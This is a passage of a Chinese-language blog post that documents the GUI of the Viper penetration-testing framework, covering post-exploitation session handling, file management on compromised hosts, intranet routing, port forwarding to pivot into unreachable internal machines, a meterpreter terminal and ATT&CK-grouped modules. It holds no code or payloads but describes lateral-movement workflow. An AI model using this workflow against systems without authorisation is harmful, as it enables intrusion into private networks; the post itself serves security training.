<h3 id="权限操作"><a href="#权限操作" class="headerlink" title="权限操作"></a>权限操作</h3><h4 id="权限信息"><a href="#权限信息" class="headerlink" title="权限信息"></a>权限信息</h4><p>1、查看</p>
<ul>
<li>点击生成的Session,选择权限信息</li>
</ul>
<p>2、进程列表</p>
<ul>
<li>进程列表显示主机所有进程的信息和Session进程的信息</li>
</ul>
<h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h4><p>通过点击权限,选择 文件管理 进入主界面</p>
<p>1、文件浏览</p>
<ul>
<li>文件管理功能类似Windows的资源管理器</li>
</ul>
<p>上图功能依次为 打开根目录 打开默认目录 打开上级目录 目录栏 前往 刷新 切换默认目录 新建文件夹 上传文件</p>
<ul>
<li><p>文件夹及磁盘支持双击进入,目录栏支持输入指定目录后回车进入目录</p>
</li>
<li><p>支持直接查看不大于100kb的文件</p>
</li>
<li><p>支持切换工作目录&#x2F;刷新当前目录</p>
</li>
</ul>
<p>2、新建文件夹&#x2F;上传文件&#x2F;下载文件</p>
<ul>
<li>点击上方新建文件夹按钮可在当前目录新建文件夹</li>
<li>点击上传按钮可打开服务端文件管理器,可以将服务器的文件上传到当前目录</li>
<li>点击 下载 链接,后台自动建立下载文件任务,下载的文件会存储在 文件管理 中</li>
</ul>
<p>3、执行文件</p>
<ul>
<li>支持带参数执行可执行文件(无回显)</li>
</ul>
<p>5、修改文件</p>
<ul>
<li>可直接修改主机的文本类文件</li>
</ul>
<h4 id="内网路由"><a href="#内网路由" class="headerlink" title="内网路由"></a>内网路由</h4><ul>
<li>自动模式 中,Session会根据所在主机网卡IP&#x2F;掩码&#x2F;网关自动添加路由</li>
<li>如果内网某个网卡有多个子网,还可以通过手工输入的方式添加</li>
<li>内网路由页面只显示当前Session添加的路由,如果需要查看所有路由,可以通过内网代理 路由列表 查看所有路由</li>
</ul>
<p>Viper内网路由即是Metasploit的route功能,具体原理可以参考如下链接: </p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/125278.html">https://www.freebuf.com/articles/network/125278.html</a></p>
</blockquote>
<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>权限操作 端口转发</p>
<p>1、正向转发</p>
<ul>
<li><p>正向转发是将VPS的网络端口转发到Session所在内网的某IP某端口.常用于连接内网的某服务,如RDP,SSH等.</p>
</li>
<li><p>如将Session所在主机的127.0.0.1:3389映射到VPS的33889端口,可以采用如下设置</p>
</li>
<li><p>远程IP(目标) 远程端口(目标) 也可以选择内网其他主机</p>
</li>
</ul>
<p>2、反向转发</p>
<ul>
<li>反向转发是将内网的某IP某端口转发到VPS的网络端口.</li>
<li>反向转发通常用于handler监听的回连.</li>
</ul>
<p>假设你已经获取到内网192.168.3.13的权限并建立了Session,你通过一些途径了解到192.168.3.0&#x2F;24网段的其他机器无法直接连接互联网,也就是无法直接连接你的VPS.</p>
<p>此时你可以建立如下反向转发.</p>
<p>所有内网机器连接192.168.3.13:2000就相当于连接VPS的500端口</p>
<p>你可以在500端口建立监听并建立一个192.168.3.13:2000的虚拟监听.</p>
<p>此时可以使用虚拟监听192.168.3.13:2000作为载荷攻击内网其他机器.即使其无法直接连接VPS</p>
<ul>
<li>Viper的端口转发功能基于metasploit-framwork的portfwd</li>
</ul>
<h4 id="传输协议"><a href="#传输协议" class="headerlink" title="传输协议"></a>传输协议</h4><p>权限操作 传输协议</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/vipersec/help/xvarma">https://www.yuque.com/vipersec/help/xvarma</a></p>
</blockquote>
<h4 id="命令终端"><a href="#命令终端" class="headerlink" title="命令终端"></a>命令终端</h4><p><code>权限操作</code> <code>命令终端</code></p>
<p>1、命令操作</p>
<ul>
<li>命令终端中可以直接输入命令,还可以通过下方快捷键快速输入.</li>
<li>命令终端中默认使用meterpreter增强命令行,如果希望执行系统命令,可以使用shell + 命令的方式</li>
</ul>
<h4 id="删除权限"><a href="#删除权限" class="headerlink" title="删除权限"></a>删除权限</h4><p><code>权限操作</code> <code>删除权限</code></p>
<ul>
<li><p>可以使用删除权限功能关闭已获得的session</p>
</li>
<li><p>删除权限后无法撤销!</p>
</li>
</ul>
<h3 id="主机操作"><a href="#主机操作" class="headerlink" title="主机操作"></a>主机操作</h3><h4 id="主机信息"><a href="#主机信息" class="headerlink" title="主机信息"></a>主机信息</h4><p>1、读取缓存&#x2F;重新请求</p>
<ul>
<li>每次打开窗口时会自动读取数据库中缓存的主机信息</li>
<li>点击 重新请求 会在后台执行更新主机信息模块,模块执行完成后自动将结果存储到数据库中.</li>
</ul>
<p>2、主机信息<br>3、网卡信息<br>4、本地监听<br>5、外网连接 判断主机有哪些联网应用<br>6、内网连接 通常用于判断内网其他主机的IP地址及服务<br>7、ARP信息 用于查找内网网段<br>8、重要进程 用于判断主机的杀软及远控软件(teamviewer&#x2F;anydesk)运行情况<br>9、所有连接<br>10、所有进程</p>
<h4 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h4><p>数据来源，展示的端口信息主要来源于三个模块:</p>
<ul>
<li><p>端口扫描与服务识别</p>
</li>
<li><p>端口扫描</p>
</li>
<li><p>内网ARP扫描</p>
</li>
</ul>
<p>可以在 <code>运行模块</code> <code>选择过滤</code> <code>信息收集</code> 类模块中找到这三个模块.</p>
<h4 id="已知漏洞"><a href="#已知漏洞" class="headerlink" title="已知漏洞"></a>已知漏洞</h4><ul>
<li>当前功能适配 MS17-010扫描 模块</li>
<li>已知功能当前适配的模块很少,属于框架型功能</li>
</ul>
<h4 id="修改备注"><a href="#修改备注" class="headerlink" title="修改备注"></a>修改备注</h4><p><code>主机操作</code> <code>修改备注</code> 或直接点击主机图标标签修改</p>
<h4 id="删除主机"><a href="#删除主机" class="headerlink" title="删除主机"></a>删除主机</h4><p><code>主机操作</code> <code>删除主机</code> 或在 <code>主机管理</code> 中批量删除</p>
<p>常见问题</p>
<ul>
<li>为什么无法删除主机?</li>
</ul>
<p>如果当前主机有正在活动的Session,viper会自动新建主机信息</p>
<ul>
<li>为什么删除主机后Session仍然存在?</li>
</ul>
<p>删除主机只会删除数据库中存储的主机相关信息,viper并不会关闭对应session</p>
<h2 id="Viper-运行模块"><a href="#Viper-运行模块" class="headerlink" title="Viper 运行模块"></a>Viper 运行模块</h2><h3 id="模块类别"><a href="#模块类别" class="headerlink" title="模块类别"></a>模块类别</h3><ul>
<li>资源部署</li>
<li>初始访问</li>
<li>执行</li>
<li>持久化</li>
<li>权限提升</li>
<li>防御绕过</li>
<li>凭证访问</li>
<li>信息收集</li>
<li>数据采集</li>
<li>全网扫描</li>
<li>被动扫描</li>
</ul>
<h3 id="需要Session模块-无需Session模块"><a href="#需要Session模块-无需Session模块" class="headerlink" title="需要Session模块&#x2F;无需Session模块"></a>需要Session模块&#x2F;无需Session模块</h3><ul>
<li>当在存在Session的行点击运行模块时，显示所有可用的模块，包括需要Sesison和无需Session的模块</li>
</ul>
<h3 id="过滤-查找-标注模块"><a href="#过滤-查找-标注模块" class="headerlink" title="过滤&#x2F;查找&#x2F;标注模块"></a>过滤&#x2F;查找&#x2F;标注模块</h3><ul>
<li><p>Viper的根据ATT&amp;TK对模块进行分类,可以通过选择栏进行过滤选择</p>
</li>
<li><p>支持根据关键字搜索模块,搜索功能会根据名称&#x2F;TTPs&#x2F;简介进行匹配</p>
</li>
</ul>
<h3 id="参数-说明"><a href="#参数-说明" class="headerlink" title="参数&#x2F;说明"></a>参数&#x2F;说明</h3><ul>
<li>左侧点击选择模块后,右侧默认显示模块所需参数.鼠标移到参数上方时自动显示参数说明</li>
<li>右侧还可以切换到说明选项卡,展示模块的更多信息</li>
</ul>
<p>适用权限是指模块可以在哪些权限下运行,如上图1表示模块可以在 普通用户权限,管理员权限.SYSTEM权限下都可以运行,图二表示模块只能在管理员及SYSTEM权限下运行.</p>
<h3 id="运行-结果输出"><a href="#运行-结果输出" class="headerlink" title="运行&#x2F;结果输出"></a>运行&#x2F;结果输出</h3><ul>
<li>输入参数后点击运行即可运行模块</li>
<li>运行后切换到 实时输出 可以看到模块运行状态</li>
</ul>
<p>右侧通知列表会显示 模块进入后台 模块运行时输出的日志 模块运行结束后提示 等</p>
<p>左侧展示模块的运行结果,包括 运行结束时间 主机IP 模块名称 模块参数 模块结果输出 等</p>
<ul>
<li>如果模块运行时间较长,可以在任务列表页面查看后台有哪些模块在运行</li>
<li>点击删除按钮会手动终止模块后台运行</li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">hihopkc</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://hihopkc.github.io/posts/33922.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://hihopkc.github.io/posts/33922.html')">Viper渗透框架</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://hihopkc.github.io/posts/33922.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Viper渗透框架&amp;url=https://hihopkc.github.io/posts/33922.html&amp;pic=/img/default_cover.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hihopkc.github.io" target="_blank">嘻哈磕碜のBlogs</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308290021297.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/12795.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308271120337.svg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">binwalk提取不了文件</div></div></a></div><div class="next-post pull-right"><a href="/posts/59793.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308290035016.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023年第三届陕西省大学生网络安全技能大赛WP</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description">站在巨人的肩上</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">hihopkc</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hihopkc" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/56853573" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Viper%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6"><span class="toc-number">1.</span> <span class="toc-text">Viper渗透框架</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Viper%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">Viper简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Viper%E5%AE%89%E8%A3%85"><span class="toc-number">1.2.</span> <span class="toc-text">Viper安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E5%AE%89%E8%A3%85"><span class="toc-number">1.2.1.</span> <span class="toc-text">脚本安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E5%AE%89%E8%A3%85"><span class="toc-number">1.2.2.</span> <span class="toc-text">手动安装</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Viper-%E7%99%BB%E5%BD%95"><span class="toc-number">1.3.</span> <span class="toc-text">Viper 登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Viper-%E9%85%8D%E7%BD%AE"><span class="toc-number">1.4.</span> <span class="toc-text">Viper 配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0"><span class="toc-number">1.4.1.</span> <span class="toc-text">版本更新</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.2.</span> <span class="toc-text">修改密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%97%AD-%E9%87%8D%E5%90%AF"><span class="toc-number">1.4.3.</span> <span class="toc-text">关闭&#x2F;重启</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95"><span class="toc-number">1.4.4.</span> <span class="toc-text">安装目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Viper%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">Viper基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%97%B6%E8%BE%93%E5%87%BA"><span class="toc-number">1.5.1.</span> <span class="toc-text">实时输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">任务列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.5.3.</span> <span class="toc-text">监听载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Stageless"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">Stageless</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Staged"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">Staged</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%91%E5%90%AC"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">监听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">载荷</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.5.4.</span> <span class="toc-text">监听防火墙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebDelivery"><span class="toc-number">1.5.5.</span> <span class="toc-text">WebDelivery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%97%E8%A1%A8"><span class="toc-number">1.5.6.</span> <span class="toc-text">文件列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-number">1.5.7.</span> <span class="toc-text">网络拓扑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E7%BC%96%E6%8E%92"><span class="toc-number">1.5.8.</span> <span class="toc-text">自动编排</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="toc-number">1.5.9.</span> <span class="toc-text">内网代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E5%88%97%E8%A1%A8"><span class="toc-number">1.5.10.</span> <span class="toc-text">凭证列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSFCONSOLE"><span class="toc-number">1.5.11.</span> <span class="toc-text">MSFCONSOLE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%93%8D%E4%BD%9C"><span class="toc-number">1.5.12.</span> <span class="toc-text">权限操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.12.1.</span> <span class="toc-text">权限信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86"><span class="toc-number">1.5.12.2.</span> <span class="toc-text">文件管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%B7%AF%E7%94%B1"><span class="toc-number">1.5.12.3.</span> <span class="toc-text">内网路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">1.5.12.4.</span> <span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.5.12.5.</span> <span class="toc-text">传输协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%BB%88%E7%AB%AF"><span class="toc-number">1.5.12.6.</span> <span class="toc-text">命令终端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%9D%83%E9%99%90"><span class="toc-number">1.5.12.7.</span> <span class="toc-text">删除权限</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%93%8D%E4%BD%9C"><span class="toc-number">1.5.13.</span> <span class="toc-text">主机操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.13.1.</span> <span class="toc-text">主机信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.5.13.2.</span> <span class="toc-text">开放端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.13.3.</span> <span class="toc-text">已知漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%A4%87%E6%B3%A8"><span class="toc-number">1.5.13.4.</span> <span class="toc-text">修改备注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.5.13.5.</span> <span class="toc-text">删除主机</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Viper-%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%9D%97"><span class="toc-number">1.6.</span> <span class="toc-text">Viper 运行模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E7%B1%BB%E5%88%AB"><span class="toc-number">1.6.1.</span> <span class="toc-text">模块类别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9C%80%E8%A6%81Session%E6%A8%A1%E5%9D%97-%E6%97%A0%E9%9C%80Session%E6%A8%A1%E5%9D%97"><span class="toc-number">1.6.2.</span> <span class="toc-text">需要Session模块&#x2F;无需Session模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-%E6%9F%A5%E6%89%BE-%E6%A0%87%E6%B3%A8%E6%A8%A1%E5%9D%97"><span class="toc-number">1.6.3.</span> <span class="toc-text">过滤&#x2F;查找&#x2F;标注模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0-%E8%AF%B4%E6%98%8E"><span class="toc-number">1.6.4.</span> <span class="toc-text">参数&#x2F;说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-%E7%BB%93%E6%9E%9C%E8%BE%93%E5%87%BA"><span class="toc-number">1.6.5.</span> <span class="toc-text">运行&#x2F;结果输出</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/d84f.html" title="第二届陇剑杯WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308290021297.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第二届陇剑杯WP"/></a><div class="content"><a class="title" href="/posts/d84f.html" title="第二届陇剑杯WP">第二届陇剑杯WP</a><time datetime="2023-08-28T16:20:43.000Z" title="发表于 2023-08-29 00:20:43">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/78fc.html" title="渗透测试内网信息收集"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试内网信息收集"/></a><div class="content"><a class="title" href="/posts/78fc.html" title="渗透测试内网信息收集">渗透测试内网信息收集</a><time datetime="2023-08-24T03:04:00.000Z" title="发表于 2023-08-24 11:04:00">2023-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/da24.html" title="渗透测试内网域环境搭建"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试内网域环境搭建"/></a><div class="content"><a class="title" href="/posts/da24.html" title="渗透测试内网域环境搭建">渗透测试内网域环境搭建</a><time datetime="2023-08-24T02:45:11.000Z" title="发表于 2023-08-24 10:45:11">2023-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/c2b3.html" title="MoeCTF2023WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308271114157.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MoeCTF2023WP"/></a><div class="content"><a class="title" href="/posts/c2b3.html" title="MoeCTF2023WP">MoeCTF2023WP</a><time datetime="2023-08-21T09:19:22.000Z" title="发表于 2023-08-21 17:19:22">2023-08-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/26b5.html" title="渗透测试内网环境分析"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试内网环境分析"/></a><div class="content"><a class="title" href="/posts/26b5.html" title="渗透测试内网环境分析">渗透测试内网环境分析</a><time datetime="2023-08-19T08:22:38.000Z" title="发表于 2023-08-19 16:22:38">2023-08-19</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" href="mailto:975025272@qq.com" title="email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a><img class="footer_mini_logo" title="返回顶部" alt="返回顶部" onclick="anzhiyu.scrollToDest(0, 500)" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/hihopkc" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title="博客框架为Hexo_v5.4.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 